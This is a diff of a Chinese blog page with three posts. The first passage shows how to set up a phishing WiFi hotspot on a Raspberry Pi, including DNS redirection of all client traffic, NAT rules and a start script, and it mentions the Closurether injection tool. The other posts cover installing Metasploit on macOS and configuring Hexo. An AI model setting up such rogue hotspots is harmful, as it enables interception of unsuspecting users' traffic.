+<p>依次执行进行 下载、解包、编译、安装。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;wget https://nodejs.org/dist/v8.9.4/node-v8.9.4.tar.gz</span><br><span class="line">&gt;tar zxvf node-v8.9.4.tar.gz</span><br><span class="line">&gt;<span class="built_in">cd</span> node-v9.6.1</span><br><span class="line">&gt;./configure</span><br><span class="line">&gt;make</span><br><span class="line">&gt;make install </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>下载 <code>Closurether</code> 神器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/LFODER/closurether.git</span><br></pre></td></tr></table></figure>
+<p>通过 <code>git</code> 克隆到本地，开始运行</p>
+<p><strong> 这里还要安装一个神器 <code>Closurether</code> </strong>  未完待续</p>
+<h4 id="修改-hostapd-配置文件"><a href="#修改-hostapd-配置文件" class="headerlink" title="修改 hostapd 配置文件"></a>修改 <code>hostapd</code> 配置文件</h4><p>安装好后，分别来修改配置文件，首先修改 <code>hostapd</code>的配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hostapd/hostapd.conf</span><br></pre></td></tr></table></figure>
+<p>查找并修改以下内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 你即将建立热点的无线网卡名字  可以用 ifconfig 或者 iw list 查看</span></span><br><span class="line">interface=wlan1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 无线网卡驱动</span></span><br><span class="line">driver=nl80211</span><br><span class="line"><span class="meta">#</span><span class="bash"> 热点名字</span></span><br><span class="line">ssid=RaspberryPi</span><br><span class="line">hw_mode=g</span><br><span class="line">channel=11</span><br><span class="line"><span class="meta">#</span><span class="bash"> auth_alg 设置为1 表示开放网络 具体你可以选择 百度一下这个字段</span></span><br><span class="line">auth_alg=1</span><br><span class="line">wmm_enabled=0</span><br></pre></td></tr></table></figure>
+<p>当然你也可以设置 <strong>加密</strong> 的WiFi热点，具体配置方法，请 <a href="https://www.jianshu.com/p/1fca72a710d5" target="_blank" rel="noopener">参考这里</a> 。</p>
+<h4 id="修改-dnsmasq-配置文件"><a href="#修改-dnsmasq-配置文件" class="headerlink" title="修改 dnsmasq 配置文件"></a>修改 <code>dnsmasq</code> 配置文件</h4><p>接下来修改 <code>dnsmasq</code> 的配置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/dnsmasq.conf</span><br></pre></td></tr></table></figure>
+<p>找到修改或添加以下内容:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 你即将建立热点的无线网卡名字 可以用 ifconfig 或 iw list 查看</span></span><br><span class="line">interface=wlan1</span><br><span class="line"><span class="meta">#</span><span class="bash"> DNS</span></span><br><span class="line">listen-address=192.168.22.1</span><br><span class="line">bind-interface</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置你的热点可分配IP范围和租用周期。</span></span><br><span class="line">dhcp-range=192.168.22.2,192.168.22.254,12h</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置子网掩码</span></span><br><span class="line">dhcp-option=1,255.255.255.0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3是网关  6具体是什么意思 忘记了  我只记得又一个是DNS配置 具体需要查阅资料</span></span><br><span class="line">dhcp-option=3,192.168.22.1</span><br><span class="line">dhcp-option=6,192.168.22.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 所有连接上热点的客户端 所有流量全解析到 192.168.22.1  </span></span><br><span class="line">address=/#/192.168.22.1</span><br></pre></td></tr></table></figure>
+<p>关于 <code>dnsmasq</code> 相关推荐：</p>
+<ul>
+<li><a href="https://biji.io/2017/4738.html" target="_blank" rel="noopener">通过Dnsmasq自建干净的DNS服务</a></li>
+<li><a href="https://www.v2ex.com/t/253201" target="_blank" rel="noopener">DNS非标准端口设置问题</a></li>
+</ul>
+<p>设置 IPv4 转发</p>
+<p>设置 IPv4 转发，通过修改文件配置来打开 IPv4 转发。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure>
+<p>找到 <code>net.ipv4.ip_forward=1</code>，去掉注释符号，使其生效。</p>
+<p>但是这样设置，需要在下次重启后才会生效，如果不想重启直接执行下面命令即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">"echo 1 &gt;/proc/sys/net/ipv4/ip_forward"</span></span><br></pre></td></tr></table></figure>
+<h4 id="修改防火墙设置"><a href="#修改防火墙设置" class="headerlink" title="修改防火墙设置"></a>修改防火墙设置</h4><p>我这里是将以太网 <code>eth0</code> 接口共享给树莓派外接网卡 <code>wlan1</code> 接口上网，需要配置NAT，需要先对防火墙进行操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -t nat -APOSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>当然如果不想每次都设置，可以使用以下命令设置为开机自启动：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">"iptables-save&gt; /etc/iptables.ipv4.nat"</span></span><br></pre></td></tr></table></figure>
+<h3 id="启动钓鱼热点"><a href="#启动钓鱼热点" class="headerlink" title="启动钓鱼热点"></a>启动钓鱼热点</h3><p>这里给出一个 <code>bash</code>  脚本，作用很简单， 开启和关闭钓鱼热点，保存文件到任何目录</p>
+<p>假设你存储的文件名为 <code>apapap.sh</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">    "start")</span><br><span class="line">       sleep 1</span><br><span class="line">       ifconfig wlan1 192.168.22.1 netmask 255.255.255.0  </span><br><span class="line">       sleep 1</span><br><span class="line">       echo "1" &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">       sleep 1</span><br><span class="line">       iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE     </span><br><span class="line">       sleep 1</span><br><span class="line">       /etc/init.d/hostapd start</span><br><span class="line">       sleep 1</span><br><span class="line">       /etc/init.d/dnsmasq start</span><br><span class="line">    ;;</span><br><span class="line">    "stop")</span><br><span class="line">       /etc/init.d/dnsmasq stop</span><br><span class="line">       /etc/init.d/hostapd stop</span><br><span class="line">       sleep 1</span><br><span class="line">       iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE  </span><br><span class="line">       sleep 1</span><br><span class="line">       echo "0" &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">       sleep 1</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">       echo "Usage $0 &#123;start|stop&#125;"</span><br><span class="line">    ;;</span><br><span class="line">    esac</span><br></pre></td></tr></table></figure>
+<p>首先要给文件执行权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 755 apapap.sh</span><br></pre></td></tr></table></figure>
+<p>然后执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./apapap.sh</span><br></pre></td></tr></table></figure>
+<p>正常会出现：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./apapap.sh </span></span><br><span class="line">Usage ./apapap.sh &#123;start|stop&#125;</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>用法一目了然，看看正常启动的状态。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./apapap.sh start</span></span><br><span class="line">[ ok ] Starting hostapd (via systemctl): hostapd.service.</span><br><span class="line">[ ok ] Starting dnsmasq (via systemctl): dnsmasq.service.</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>不出意外的话，执行完成了就是这样，此时你去查看Wifi热点，看是否成功开启了。</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1foqfkel5jgj30fs0xm40p.jpg" alt=""></p>
+<p>已经开启了热点，现在连入wifi的所有客户端浏览都经过树莓派网卡。</p>
+<p>一些😈邪恶的玩法 ，请参考这里：<a href="http://www.freebuf.com/articles/web/43353.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/43353.html</a> </p>
 
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
-
-      
-        
-          MacOS上安装MetaSploit,更多内容请阅读全文
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/02/22/MacOS安装Metasploit全攻略/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/02/22/MacOS安装Metasploit全攻略/">
+                MacOS安装Metasploit全攻略
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-02-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/MetaSploit教程/">MetaSploit教程</a>
+                </span>
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/02/21/Hexo博客调教日记/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2018/02/21/Hexo博客调教日记/" itemprop="url">Hexo博客调教日记</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-21T17:16:03+08:00">2018-02-21</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="categories/Hexo教程/" itemprop="url" rel="index"><span itemprop="name">Hexo教程</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+        <div class="content">
+            <h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
+<li>系 统: <code>MacOS Sierra 10.12.6</code></li>
+</ul>
+<h2 id="下载MetaSploit官方最新版"><a href="#下载MetaSploit官方最新版" class="headerlink" title="下载MetaSploit官方最新版"></a>下载MetaSploit官方最新版</h2><p>MetaSploit Framework 最新版  <a href="http://osx.metasploit.com/metasploitframework-latest.pkg" target="_blank" rel="noopener">下载地址</a></p>
+<p>下载完成，双击安装。此时终端输入 <code>msfconsole</code> 提示找不到，是因为环境变量没有设置。</p>
+<h2 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><p>正常的方法是:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure>
+<p>然后添加</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="string">"/opt/metasploit-framework/bin:<span class="variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure>
+<p>使环境变量立刻生效</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
+<p>如果你使用的是 <code>zsh</code> 那么则是下面的方法: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>
+<p>然后添加</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="string">"/opt/metasploit-framework/bin:<span class="variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure>
+<p>使环境变量立刻生效</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
+<h2 id="运行与更新"><a href="#运行与更新" class="headerlink" title="运行与更新"></a>运行与更新</h2><p>终端输入 <code>msf</code>  并按 <code>Tab</code> 键，看是否能出现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msf</span><br><span class="line">msfbinscan   msfdb        msfpescan    msfrpc       msfvenom                </span><br><span class="line">msfconsole   msfelfscan   msfremove    msfrpcd                            </span><br><span class="line">msfd         msfmachscan  msfrop       msfupdate</span><br></pre></td></tr></table></figure>
+<p>若出现上面结果，代表环境变量已经生效。</p>
+<p>接下来更新Metasploit：</p>
+<p>终端执行 <code>msfupdate</code></p>
+<p>OK</p>
+<h2 id="各种问题和解决方案"><a href="#各种问题和解决方案" class="headerlink" title="各种问题和解决方案"></a>各种问题和解决方案</h2><h3 id="搜索攻击模块时出现模块换成数据库不能建立，使用慢搜索模式"><a href="#搜索攻击模块时出现模块换成数据库不能建立，使用慢搜索模式" class="headerlink" title="搜索攻击模块时出现模块换成数据库不能建立，使用慢搜索模式"></a>搜索攻击模块时出现模块换成数据库不能建立，使用慢搜索模式</h3><p>现象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!] Module database cache not built yet, using slow search</span><br></pre></td></tr></table></figure>
+<p>解决方案:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_rebuild_cache</span><br></pre></td></tr></table></figure>
+<h3 id="没有连接上数据库"><a href="#没有连接上数据库" class="headerlink" title="没有连接上数据库"></a>没有连接上数据库</h3><p>现象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_rebuild_cache </span><br><span class="line">[-] The database is not connected</span><br><span class="line">msf &gt; db_status </span><br><span class="line">[*] postgresql selected, no connection</span><br></pre></td></tr></table></figure>
+<p>解决方案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Postgresql-服务没有启动"><a href="#Postgresql-服务没有启动" class="headerlink" title="Postgresql 服务没有启动"></a>Postgresql 服务没有启动</h3><p>现象：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfconsole </span><br><span class="line">[-] Failed to connect to the database: could not connect to server: Connection refused</span><br><span class="line">	Is the server running on host <span class="string">"127.0.0.1"</span> and accepting</span><br><span class="line">	TCP/IP connections on port 5433?</span><br></pre></td></tr></table></figure>
+<p>解决方案：</p>
 
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
-
-      
-        
-          Hexo静态博客的搭建与配置，以及自己踩过的坑
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/02/21/Hexo博客调教日记/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/02/21/Hexo博客调教日记/">
+                Hexo博客调教日记
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-02-21</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/Hexo教程/">Hexo教程</a>
+                </span>
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="extend next" rel="next" href="page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
-
-
-          </div>
-          
+        <div class="content">
+            <h2 id="Hexo-安装与配置"><a href="#Hexo-安装与配置" class="headerlink" title="Hexo 安装与配置"></a>Hexo 安装与配置</h2><h3 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h3><blockquote>
+<p><a href="https://www.baidu.com/s?ie=UTF-8&amp;wd=Hexo%E5%AE%89%E8%A3%85" target="_blank" rel="noopener">自行百度</a> | <a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">官方文档</a></p>
+</blockquote>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<p>操作系统: <code>MacOS Sierra 10.12.6</code><br>博客主题: <code>next</code></p>
+</blockquote>
+<h3 id="启动搜索功能"><a href="#启动搜索功能" class="headerlink" title="启动搜索功能"></a>启动搜索功能</h3><p>首先到博客根目录(这里指你 Hexo init 后的博客目录)执行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure></p>
+<p>然后到你的主题目录下修改 <code>_config.yml</code> 文件<br>我使用的是<code>Next</code>主题，进入博客根目录，找到 <code>themes/next/_config.yml</code> 文件，搜索 <code>local_search:</code><br>会看到如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Local search</span><br><span class="line"># Dependencies: https://github.com/theme-next/hexo-generator-searchdb</span><br><span class="line">local_search:</span><br><span class="line">  enable: false</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 1</span><br><span class="line">  # unescape html strings to the readable one</span><br><span class="line">  unescape: false</span><br></pre></td></tr></table></figure></p>
+<p>将 <code>enable: false</code> 改成 <code>enable: true</code> 即可启用本地搜索功能。<br>然后在 <code>themes/next/_config.yml</code> 文件中添加:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Search</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p>
+<h3 id="启用本地图片"><a href="#启用本地图片" class="headerlink" title="启用本地图片"></a>启用本地图片</h3><p>博客中往往会频繁使用到图片，外链图片到博客最简单的方法就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(图片描述 可选)[图片链接]</span><br></pre></td></tr></table></figure></p>
+<p>但是往往去找一个靠谱的图床是一件很头疼的事情，如果你的服务器带宽够大，可以选择使用本地图片，开启本地图片的方法:<br>首先进入博客根目录，编辑 <code>_config.yml</code> 文件，找到 <code>post_asset_folder:false</code> 修改为 <code>post_asset_folder:true</code><br>然后在博客根目录执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure></p>
+<p>此时你使用 <code>hexo new &quot;一篇博客&quot;</code> 的时候，会在博客根目录下 <code>source/_posts/</code> 下创建与博客同名的文件夹用于存放本地图片，方便在博客中调用。<br>博客调用本地图片时如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![“图片描述”（可以不写）](/文件夹名/你的图片名字.JPG)</span><br></pre></td></tr></table></figure></p>
+<h3 id="插入音乐"><a href="#插入音乐" class="headerlink" title="插入音乐"></a>插入音乐</h3><p>例如网易云，直接获取播放器外链，iframe代码直接写到Blog中即可。</p>
+<h3 id="启用分类页"><a href="#启用分类页" class="headerlink" title="启用分类页"></a>启用分类页</h3><p>首先执行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;categories&quot;</span><br></pre></td></tr></table></figure></p>
+<p>新建一个页面为 <code>categories</code> 的分类页面，然后会自动在博客根目录下的 <code>source/_posts/</code> 生成一个 <code>categories</code> 的目录，里面有一个 <code>index.md</code><br>打开看看内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &quot;categories&quot;</span><br><span class="line">date: 2018-02-22 11:44:07</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
+<p>修改成如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2018-02-22 11:44:07</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
+<p>这里就是需要添加一个 <code>type</code> 字段，类型值为 <code>categories</code></p>
+<blockquote>
+<p>如果启用过 <code>多说</code> 或者是 <code>Disqus</code> 等评论插件，默认页面也会带评论，需要关闭则添加 <code>comments</code> 字段，并设置值为 <code>false</code></p>
+</blockquote>
+<p>进入博客根目录 ，找到 <code>themes/next/_config.yml</code> ，找到主题配置文件，修改其 <code>menu</code> 标签。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || home</span><br><span class="line">  tags: /tags/ || tags</span><br><span class="line">  categories: /categories/ || th</span><br><span class="line">  archives: /archives/ || archive</span><br></pre></td></tr></table></figure></p>
+<p>这里把 categories 标签前面的注释  <code>#</code> 去掉即可。</p>
+<h3 id="启用标签页"><a href="#启用标签页" class="headerlink" title="启用标签页"></a>启用标签页</h3><p>首先执行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;tags&quot;</span><br></pre></td></tr></table></figure></p>
+<p>新建一个页面为 <code>tags</code> 的标签云页面，然后会自动在博客根目录下的 <code>source/_posts/</code> 生成一个 <code>tags</code> 的目录，里面有一个 <code>index.md</code><br>打开看看内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &quot;tags&quot;</span><br><span class="line">date: 2018-02-22 11:44:07</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
+<p>修改成如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签云</span><br><span class="line">date: 2018-02-22 11:44:07</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
+<p>这里就是需要添加一个 <code>type</code> 字段，类型值为 <code>tags</code></p>
+<blockquote>
+<p>如果启用过 <code>多说</code> 或者是 <code>Disqus</code> 等评论插件，默认页面也会带评论，需要关闭则添加 <code>comments</code> 字段，并设置值为 <code>false</code></p>
+</blockquote>
+<p>进入博客根目录 ，找到 <code>themes/next/_config.yml</code> ，找到主题配置文件，修改其 <code>menu</code> 标签。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || home</span><br><span class="line">  tags: /tags/ || tags</span><br><span class="line">  categories: /categories/ || th</span><br><span class="line">  archives: /archives/ || archive</span><br></pre></td></tr></table></figure></p>
+<p>这里把 tags 标签前面的注释  <code>#</code> 去掉即可。</p>
+<h3 id="博客中添加标签的方法"><a href="#博客中添加标签的方法" class="headerlink" title="博客中添加标签的方法"></a>博客中添加标签的方法</h3><p>在 <code>source/_posts</code> 中找到你创建的博客，编辑头部内容，格式如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hexo博客调教日记</span><br><span class="line">date: 2018-02-21 17:16:03</span><br><span class="line">categories: &quot;Hexo教程&quot;</span><br><span class="line">tags:</span><br><span class="line">    - Hexo</span><br><span class="line">    - Next</span><br><span class="line">description: 记录自己安装与使用Hexo时踩过的坑与解决方法</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
